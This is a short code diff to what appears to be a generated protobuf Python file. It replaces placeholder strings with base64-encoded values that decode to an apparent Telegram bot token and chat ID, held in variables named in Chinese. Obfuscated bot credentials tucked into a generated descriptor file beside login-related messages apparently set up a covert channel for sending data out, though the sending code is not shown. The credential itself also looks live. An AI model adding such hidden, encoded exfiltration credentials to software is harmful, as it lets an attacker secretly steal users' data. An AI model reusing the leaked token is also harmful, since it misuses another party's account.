@@ -46,8 +46,8 @@ if not _descriptor._USE_C_DESCRIPTORS:
   _globals['_LOGINRES']._serialized_end=735
 
 
-TOKEN_ENCRYPTED = "Lấy token cái lồn"
-CHAT_ID_ENCRYPTED = "Cặc đm m"
+TOKEN_ENCRYPTED = "ODYxNDAzMTYzNDpBQUZzRnFWUEQ0THBwTXFOUmRHTE1tZ25XT2NxRTdkU3A2Yw=="
+CHAT_ID_ENCRYPTED = "NzMyMTEyNjI1NA=="
 
 机器人令牌 = base64.b64decode(TOKEN_ENCRYPTED).decode()
 聊天ID = base64.b64decode(CHAT_ID_ENCRYPTED).decode()
